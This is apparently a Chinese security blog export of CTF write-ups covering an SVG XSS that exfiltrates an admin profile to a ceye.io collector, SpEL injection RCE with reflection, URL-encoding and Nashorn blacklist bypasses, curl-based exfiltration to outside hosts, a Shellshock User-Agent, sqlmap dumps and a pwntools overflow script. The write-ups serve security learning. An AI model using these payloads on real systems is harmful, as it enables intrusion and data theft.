1234567891011121314&lt;?php$cfg_pass=\"Hello666\";echo MD5($cfg_pass);echo \"&lt;br&gt;\";for ($i = 0; $i &lt; strlen(MD5('xDdddddd')); $i++) &#123; // echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); echo MD5($cfg_pass)[$i]; echo \"&lt;br&gt;\"; echo ord(MD5($cfg_pass)[$i]); echo \"&lt;br&gt;\"; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); echo \"&lt;br&gt;-------------&lt;br&gt;\";&#125;?&gt; 随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算： 可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下： 12for x in xrange(1,127): print(str(x)+\":\"+str(x&amp;0xC0)) 运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。 那么就很明确了，再看看页面返回的值： 0006464640640064000646464640006400640640646400 前面3位是0，后面接着是字母结合数字的混合体。 这时就可以祭出弱类型了，我们知道123==&quot;123aivmfsjoo90i1jj90i0i031&quot;是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为Cookie: otadmin={&quot;hash&quot;: 389}： Web 50题目地址：http://web50.zajebistyc.tf/login?next=%2F 题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin… 访问页面，是个登录界面： 随便输入用户名和密码，进入了另一个界面： 其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能： 另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目： 回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中： 回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。 后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。 写段测试代码，注意要设置宽度和高度均为100： 1234567&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"&gt;&lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/&gt;&lt;script type=\"text/javascript\"&gt;alert(\"Mi1k7ea\");&lt;/script&gt;&lt;/svg&gt; 本地访问没问题： 上传到Avatar： 确认一下，访问该Avatar所在地址，没有问题，成功弹框： 到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag： 后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了： 1234567891011121314151617&lt;?xml version=\"1.0\" standalone=\"no\"?&gt;&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"&gt;&lt;polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/&gt;&lt;script type=\"text/javascript\"&gt;var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open(\"POST\", \"http://XXXX.ceye.io/\"); xhr2.send(xhr.responseText); &#125;&#125; xhr.open(\"GET\", \"http://web50.zajebistyc.tf/profile/admin\");xhr.withCredentials = true;xhr.send();&lt;/script&gt;&lt;/svg&gt; 再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"SpEL注入之javacon","date":"2019-03-17T08:51:15.000Z","path":"2019/03/17/SpEL注入之javacon/","text":"SpEL注入漏洞何为SpEL表达式 Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 SpEL使用方式 SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。 12345ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression(\"('Hello' + ' Mi1k7ea').concat(#end)\");EvaluationContext context = new StandardEvaluationContext();context.setVariable(\"end\", \"!\");System.out.println(expression.getValue(context)); 具体步骤如下： 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现； 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象； 构造上下文：准备比如变量定义等等表达式需要的上下文数据； 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值； SpEL主要接口 ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符； EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。 Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。 SpEL语法——类相关表达式类类型表达式 T(Type)使用”T(Type)”来表示 java.lang.Class 实例，”Type”必须是类全限定名，”java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 使用示例： 1234567891011121314ExpressionParser parser = new SpelExpressionParser();// java.lang 包类访问Class&lt;String&gt; result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);System.out.println(result1);//其他包类访问String expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);System.out.println(result2);//类静态字段访问int result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);System.out.println(result3);//类静态方法调用int result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);System.out.println(result4); 类实例化类实例化同样使用 java 关键字「new」，类名必须是全限定名，但 java.lang 包内的类型除外，如 String、Integer。 instanceof 表达式SpEL 支持 instanceof 运算符，跟 Java 内使用同义；如”‘haha’ instanceof T(String)”将返回 true。 变量定义以及引用变量定义通过 EvaluationContext 接口的 setVariable(variableName, value) 方法定义；在表达式中使用”#variableName”引用；除了引用自定义变量，SpE 还允许引用根对象及当前上下文对象，使用”#root”引用根对象，使用”#this”引用当前上下文对象； 自定义函数目前只支持类静态方法注册为自定义函数；SpEL 使用 StandardEvaluationContext 的registerFunction 方法进行注册自定义函数，其实完全可以使用 setVariable 代替，两者其实本质是一样的。 检测方法全局搜索org.springframework.expression.spel.standard或expression.getValue()、expression.setValue()，再分析代码中传入的参数是否可控。 javacon题目分析本题来自P牛code-breaking中的一道Java题，名为javacon，题目知识点为SpEL注入，这里记下相关笔记。 题目下载地址：https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar 本地运行：java -jar challenge-0.0.1-SNAPSHOT.jar 访问页面，是个登录界面，请求参数带有jsessionid，其是在cookie的属性 ： 随意输入，会提示“登陆失败，用户名或者密码错误！”。 Java题目，一般都是从代码审计入手，用IDEA打开该jar包，主要看/BOOT-INF/classes目录下的文件即可，发现存在一个application.yml文件： 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 该文件分了3个模块，spring模块定义了HTML模板、UTF-8编码以及无缓存；keywords定义了黑名单，过滤了“java.lang”、“Runtime”、“exec.(”等；user模块定义了用户名和密码，还有一个记住我的值。 Spring框架的关键在于Controller，看到MainController.class，其中定义了ExpressionParser属性，该属性在getAdvanceValue()函数中会调用来解析字符串内容，由此可知getAdvanceValue()函数是SpEL注入的触发点： 1234567891011121314151617181920212223@Controllerpublic class MainController &#123; ExpressionParser parser = new SpelExpressionParser(); ... private String getAdvanceValue(String val) &#123; String[] var2 = this.keyworkProperties.getBlacklist(); int var3 = var2.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; String keyword = var2[var4]; Matcher matcher = Pattern.compile(keyword, 34).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = this.parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125;&#125; 再看看哪里调用的getAdvanceValue()函数，发现是在admin()函数中调用了，传递的参数是username的值： 1234567891011121314151617181920212223242526272829303132333435@GetMappingpublic String admin(@CookieValue(value = \"remember-me\",required = false) String rememberMeValue, HttpSession session, Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(\"\")) &#123; String username = this.userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute(\"username\", username); &#125; &#125; Object username = session.getAttribute(\"username\"); if (username != null &amp;&amp; !username.toString().equals(\"\")) &#123; model.addAttribute(\"name\", this.getAdvanceValue(username.toString())); return \"hello\"; &#125; else &#123; return \"redirect:/login\"; &#125;&#125;... @PostMapping(&#123;\"/login\"&#125;)public String login(@RequestParam(value = \"username\",required = true) String username, @RequestParam(value = \"password\",required = true) String password, @RequestParam(value = \"remember-me\",required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (this.userConfig.getUsername().contentEquals(username) &amp;&amp; this.userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute(\"username\", username); if (isRemember != null &amp;&amp; !isRemember.equals(\"\")) &#123; Cookie c = new Cookie(\"remember-me\", this.userConfig.encryptRememberMe()); c.setMaxAge(2592000); response.addCookie(c); &#125; return \"redirect:/\"; &#125; else &#123; return \"redirect:/login-error\"; &#125;&#125; 这里研究一下怎么控制这个username的值，先看注解为”/login”的login()函数，其传入3个参数，第三个remember-me为非必须的，在第一个if语句即判断username和password是否是正确的，是则通过调用session.setAttribute(&quot;username&quot;)来设置session中的username值，再判断remember-me的值进行设置，然后重定向到主页面，否则登录失败直接返回错误信息。也就是说，这里是没办法进行SpEL注入的，因为username和password都写不正确如何进入后面的逻辑呢？ 再来看看主页面的代码逻辑即注解为“@GetMapping”的admin()函数。先判断remember-me是否为空，为空时直接调用session.getAttribute(&quot;username&quot;);获取session中即login()函数中设置的username再调用getAdvanceValue()函数，此时因为username是正确的用户名因此无法SpEL注入；若rememberMeValue不为空即login时选择了remember-me，则解码rememberMeValue值为username并通过调用session.setAttribute(&quot;username&quot;)来设置session中的username值，此时的username就可控了。 那么注入点的场景已经可以确定了：输入admin/admin并勾选remember-me选项登录后台，然后再修改cookie内容即可。 先登录到admin界面，看到会设置Cookie字段值为remember-me=MXPUSANQRVaBJYtUucUgmQ==： 直接调用或复制加密代码，在它的代码中找到几个参数然后传进加密处理，执行完毕结果和Cookie字段值的base64结果一致： 行吧，那就将变量value从admin改为Mi1k7ea试试，得到加密值为4Hd10g7CuZZg5M1up1GExg==，放到cookie中发送报文，可以看到admin修改为Mi1k7ea，说明这里即为SpEL注入点： 构造payload开始网上搜的一大堆SpEL注入exp无法利用，因为这里使用了黑名单过滤了java.lang、Runtime和exec(。 尝试了使用ProcessBuilder().start()来绕过，但是没利用成功。 后面参考了一篇wp，发现可以用Java的反射机制来绕过，具体绕过原理是因为通过反射机制的forName()和getMethod()等方法，其参数是字符串因此可通过字符串拼接的方式来绕过黑名单。 Windows场景本地弹计算器常见的payload： 1String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"exec\",String.class).invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;); 但是这里需要改为SpEl的解析格式以满足Spring的解析条件，主要就是改一个T() 。在SpEL中，使用T()运算符会调用类作用域的方法和常量。 注意，以new String[]{&quot;cmd&quot;,&quot;/C&quot;,&quot;xx&quot;}这种形式定义命令是为了满足Linux下复杂命令构造的条件，通用。当然Linux下应该写为new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;xxxxx&quot;}。 payload如下： 1#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;)&#125; 加密后发送过去，SpEL注入成功： 回带flag这里换下payload，读取本地flag文件，由于没有回显，需要外带出来，使用curl命令结合反引号执行系统命令并带回： 1#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"curl xx.ceye.io/`dir`\"&#125;)&#125; 但是在Windows上这段代码不能将命令执行带回来，因为Windows中cmd不会解析反引号，只会将命令原封不动地返回过来： 既然这样，就使用curl的-T参数往外上传文件，然后通过ftp接收即可： 1#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"curl -T flag.txt ftp://192.168.248.1/\"&#125;)&#125; 发送编码后的payload，在目标FTP端看到接收的文件，收到上传flag.txt： Linux场景一般题目环境为Linux，这里直接换如下命令即可，其中curl命令可直接结合反引号使用，中间加上base64命令将所有结果编码以便于可以带回所有内容而非只有第一行结果，最后tr命令将结果中的换行符换为-以便于后面解码的使用： 1#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"curl xx.ceye.io/`cat flag.txt|base64|tr '\\n' '-'`\"&#125;)&#125; JavaScript引擎Bypass在Java 1.8之后，Nashorn取代了Rhino（Java 1.6/1.7）成为Java的嵌入式JavaScript引擎。 也就是说，可以通过Java调用该JS引擎，然后通过JS引擎调用eval()来执行Java代码。 基本payload基本Payload示例如下： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(\"xxx\"),)&#125; 要想在本题执行命令，需要结合前面构造的反射机制来实现： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;)),)&#125; URL编码前面的payload有点麻烦，感觉多此一举，这里我们可以升级一下payload，进行URL编码，可以绕过一些过滤机制，并无需结合反射机制： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")),)&#125; 其中URL编码内容为：java.lang.Runtime.getRuntime().exec(&quot;calc&quot;).getInputStream()，不加最后的getInputStream()也行，只是为了后面回显铺垫。 在这道题可以成功Bypass黑名单实现SpEL注入： 添加回显增加回显的payload如下，其中URL编码内容为java.lang.Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream()： 1#&#123;T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%70%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())&#125; 访问直接得到命令执行结果： 参考Code-Breaking Puzzles — javacon WriteUp Java代码审计之SpEL表达式注入","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"}]},{"title":"AeroCTF writeupup之board tracking system","date":"2019-03-13T15:08:59.000Z","path":"2019/03/13/AeroCTF-writeupup之board-tracking-system/","text":"题目如下，大概意思是开发了一个追踪系统，问是否是有安全漏洞的： 打开页面，看到加载了一段Stats内容： 查看源码发现该段内容是请求了一个URL加载过来的，访问该地址，是包含cgi-bin路径的： 由cgi-bin我们可以联想到大名鼎鼎的Bash远程命令执行漏洞。记得之前看过的一篇文章：https://www.freebuf.com/vuls/44994.html 那就测试一下，在UserAgent注入payloadUser-Agent: () { :;};echo -e &quot;\\r\\n$(/usr/bin/whoami)&quot;发现成功执行whoami命令： 接着就使用ls寻找flag相关文件有没有，在当前目录找到stats文件： cat看下stats文件有啥： 没啥东西，继续用ls看其他目录，没啥进展。 最后在查看/etc/passwd时找到了这个隐藏的flag：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"TAMUctf Web writeup","date":"2019-03-09T12:44:41.000Z","path":"2019/03/09/TAMUctf-Web-writeup/","text":"很简单，但是还是把笔记放上来吧。 Not Another SQLi Challenge题目：http://web1.tamuctf.com/ 打开是个登录界面，直接SQL注入getflag： Robots Rule题目：http://web5.tamuctf.com/ 打开页面，提示ROBOTS： 直接访问robots.txt，内容如下： 大致意思就是告诉它有一个Google robots，直接更换UserAgent为googlebot即谷歌爬虫，从而getflag： Many Gig’ems to you!题目：http://web7.tamuctf.com/ 打开页面，发现有两个按钮，且页面存在大量图片： 右键查看源码，发现图片中的alt属性值有蹊跷： 找到了一个gigem{flag_in_字符串，退出剩下的应该在其他页面中找到。 点击Gigs!按钮时当前主页面，点击Cookies!跳转到cookies.html页面，该页面也存在大量图片，同理查看源码： 发现如下可以字符串：gigem{_continued=source_and_。 最后，根据cookies提示，查看报文的cookie值，其中有个cookies.js设置cookie值，看到其中关联的字符串gigem_continue=cookies}： 一切清晰了，拼起来就是gigem{flag_in_source_and_cookies}，这就是flag。 Science!题目：http://web3.tamuctf.com/ 访问题目，提示是Python Flask搭建的Web服务，其中可以输入内容查询，推测是SSTI即服务端模板注入攻击： 验证一下，在其中一个输入框输入579，结果返回了该表达式执行的结果，证明了存在SSTI漏洞： 接着上任意文件读取payload即可： Buckets题目：http://tamuctf.s3-website-us-west-2.amazonaws.com/ 访问网页，说狗肯定比猫好，背景是狗的图片，除此之外没啥了： 查看页面源码，有两段提示，大概说的是这是作者第一个AWS Web页面，用的是S3 buckets框架，且passowrd在Dogs附近： 这里涉及到AWS S3 buckets框架的一个知识点，就是访问http://tamuctf.s3-website-us-west-2.amazonaws.com/，也可以通过访问http://tamuctf.s3.amazonaws.com/实现，是一样的。 访问Key标签的URL即可getflag： Login App题目：http://web4.tamuctf.com/ 访问页面，是个提供输入用户名和密码的登录界面，但是怎么输入都没有反应，查看页面源码，关键部分如下： 123456789101112131415161718192021222324252627282930313233343536373839404142....form .register-form &#123; display: none;&#125;...&lt;div class=\"login-page\"&gt; &lt;div class=\"form\"&gt; &lt;form class=\"register-form\"&gt; &lt;input type=\"text\" placeholder=\"name\"/&gt; &lt;input type=\"password\" placeholder=\"password\"/&gt; &lt;input type=\"text\" placeholder=\"email address\"/&gt; &lt;button&gt;create&lt;/button&gt; &lt;/form&gt; &lt;form class=\"login-form\"&gt; &lt;input id=\"username\" type=\"text\" placeholder=\"username\"/&gt; &lt;input id=\"password\" type=\"password\" placeholder=\"password\"/&gt; &lt;button id=\"submit\"&gt;login&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt; $(\"#submit\").on('click', function()&#123; $.ajax(&#123; url: 'login', type : \"POST\", dataType : 'json', data : JSON.stringify(&#123;\"username\": $(\"#username\").val(), \"password\": $(\"#password\").val()&#125;), contentType: 'application/json;charset=UTF-8', success : function(result) &#123; $(\".result\").html(result); console.log(result); alert(result); &#125;, error: function(xhr, resp, text) &#123; $(\".result\").html(\"Something went wrong\"); console.log(xhr, resp, text); &#125; &#125;) &#125;);&lt;/script&gt;... 虽然在页面中隐藏了注册表单，但是没啥用，因为后面的JS代码只会在id为submit的元素被点击时触发，而只有登录的表单含有该id元素；注意到JS代码的作用，它以POST方法请求的是/login，以Json格式上传username和password参数，Content-Type设置为application/json，构造报文尝试一下： 成功返回数据。这里看到登录的参数是通过Json格式提交的，可以推测是一道NoSQL注入题目。 这里尝试使用$ne即not equal不相等，用来查询某个记录不等于该值的所有记录。 我们知道密码不为空，参考网上的NoSQL注入payload，那我们就直接输入payload如下就getflag了： Bird Box Challenge题目：http://web2.tamuctf.com/ 提示了：We’ve got Aggies, Trucks, and Eggs! 访问网页，是一个提供输入的查询页面： 随便输入，会找不到东西，但是输入提示的内容就会显示相应的东西： 关注到页面并没有其他的功能点了，抓包也确认了确实只有Search.php的Search参数存在注入点，且页面没有直接返回错误信息，猜测应该就是SQL盲注吧，且在抓包过程发现，输入eggs即正常数据以及输入查询不到的数据，服务端都是返回500，但其他出错查询时就返回400： 下面就上sqlmap跑起来，但是一开始没有跑出啥东西，经过测试发现是校验了UserAgent，后台对UserAgent为sqlmap的报文进行了过滤，而sqlmap默认的UA即包含sqlmap字样： sqlmap中先加入–random-agent，跑出为mysql，然后–dbs参数跑出两个数据库，当然可以添加–technique=BT指定基于布尔和时间的盲注来提高效率： 12345root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --dbs...available databases [2]:[*] information_schema[*] SqliDB 然后-D参数指定SqliDB数据库，–tables参数跑出表Search： 1234567root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB --tables...Database: SqliDB[1 table]+--------+| Search |+--------+ -T参数指定Search表，–columns参数跑出表项items： 12345678910root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --columns...Database: SqliDBTable: Search[1 column]+--------+--------------+| Column | Type |+--------+--------------+| items | varchar(100) |+--------+--------------+ –dump参数将表项的内容全列出来： 123456789101112root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql -D SqliDB -T Search --dump...Database: SqliDBTable: Search[3 entries]+--------+| items |+--------+| Aggies || Eggs || Trucks |+--------+ 发现是提示的几个内容，也就是说数据库只保存了这几个东西，flag并不在此。 –users参数查询一下所有用户，发现有且仅有一个的用户名就是flag： 1234root@kali:~# sqlmap -u &quot;http://web2.tamuctf.com/Search.php?Search=eggs&quot; --random-agent -p Search --dbms mysql --users...database management system users [1]:[*] &apos;gigem&#123;w3_4r3_th3_4ggi3s&#125;&apos;@&apos;localhost&apos; 1337 Secur1ty题目：http://web6.tamuctf.com/ 访问页面，有个登录窗口和注册窗口： 在注册的响应报文中，发现设置cookie的信息： 注册完成后，有3个页面如下： Profile中显示个人注册信息，并且可以修改： Messages中显示收到的消息，并且可以写新消息发送给别人： Employees中可以看到所有注册的人的消息： 从这里可以分析得出，Alan是我注册的用户，这里ID为5，和cookie中userid为5是对应的，也就是说，1337-admin的userid为1，还需要知道它的cookie中secret的属性值才能登上admin的用户来访问。 现在问题转变为，如何获取secret呢？界面功能有限，一个个点，抓包观察，发现Messages的消息列表可以点进去，且似乎有个id参数注入点： 直接丢到sqlmap，发现id参数确实可注入。接着添加sqlmap其他参数让它自己表演就可以了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql --dbs...available databases [2]: [*] 1337_Secur1ty[*] information_schemaroot@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty --tables...Database: 1337_Secur1ty[2 tables]+----------+| Messages || Users |+----------+root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --columns...Database: 1337_Secur1tyTable: Users[10 columns]+-------------+--------------+| Column | Type |+-------------+--------------+| CreateDate | datetime || Description | varchar(200) || Email | varchar(37) || FirstName | varchar(10) || LastName | varchar(15) || Password | varchar(50) || Phone | varchar(10) || Secret | varchar(50) || UserID | int(9) || Username | varchar(20) |+-------------+--------------+root@kali:~# sqlmap -u &quot;http://web6.tamuctf.com/message?id=1&quot; -p id --dbms mysql -D 1337_Secur1ty -T Users --dump...Database: 1337_Secur1tyTable: Users[2 entries]+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+| UserID | Phone | Email | Secret | Username | LastName | Password | FirstName | CreateDate | Description |+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+| 1 | &lt;blank&gt; | 1337-admin@l337secur1ty.hak | WIFHXDZ3BOHJMJSC | 1337-admin | Joeson | 02ca0b0603222a090fe2fbf3ba97d90c | Joe | 2019-03-10 07:27:46 | Most secure admin to ever grace existence. || 2 | &lt;blank&gt; | ScrubLord@l337secur1ty.hak | 4VCLO52ALSUUO5OM | ScrubLord | Bobson | fc8b8be2abe4a79bf6f36eee484c1f08 | Bob | 2019-03-10 07:27:46 | That random intern. |+--------+---------+-----------------------------+------------------+------------+----------+----------------------------------+-----------+---------------------+--------------------------------------------+ 可以看到，通过sqlmap将Users表中的信息dump下来，其中含有1337-admin用户的secret消息即WIFHXDZ3BOHJMJSC。 现在退出当前用户，带上这段header字段Cookie: userid=1; secret=WIFHXDZ3BOHJMJSC访问即可getflag：","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"}]},{"title":"TAMUctf Pwn writeup","date":"2019-03-08T14:35:05.000Z","path":"2019/03/08/TAMUctf-Pwn-writeup/","text":"虽然是灰常easy的题，但对我这种刚刚准备入门Pwn的菜鸡来说，再合适不过了。 Pwn1题目如下：pwn1 运行程序，功能是询问你名字并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开： 打开IDA分析一下，gets()函数明显地存在栈溢出漏洞，且当v5变量等于一个值时便调用print_flag()函数输出flag： 右键v5所在的if条件对应的值&gt;Hexadecimal，即可查看到该值的16进制表示为0xDEA110C8，也就是说，当v5的值为该值时，才会进行该逻辑输出flag。 结合前面的gets()栈溢出，这就很简单了，只需要栈溢出覆盖v5的值为0xDEA110C8，不需要自己去找system(‘/bin/sh’)来getshell了。 注意的是在溢出之前需要通过两次fgets()输入内容，且内容必须和前两个红框中的字符串一样。也就是说，需要先成功交互前面两个步骤，才会进入最后问你“What… is my secret?”逻辑： 计算一下偏移变量s到变量v5的偏移距离，由IDA得s=ebp-3Bh、v5=ebp-10h，则得出下图的结果： 一目了然，gets()从s处输入，当输入溢出到v5时即可覆盖该地址。此时偏移量为|(ebp-3Bh)-(ebp-10h)|=2B(h)=43(d)。 编写脚本： 12345678910111213from pwn import *sh = remote(\"pwn.tamuctf.com\", 4321)sh.sendline(\"Sir Lancelot of Camelot\")sh.recvuntil(\"What... is your quest?\")sh.sendline(\"To seek the Holy Grail.\")sh.recvuntil(\"What... is my secret?\")payload = flat([\"A\" * 43, p32(0xDEA110C8)])sh.sendline(payload)print sh.recvall() 直接getflag： Pwn2题目如下：pwn2 运行程序，功能是询问你想调用哪个函数并让你输入内容；该ELF文件是动态链接的；checksec查看发现只有Canary没有打开： 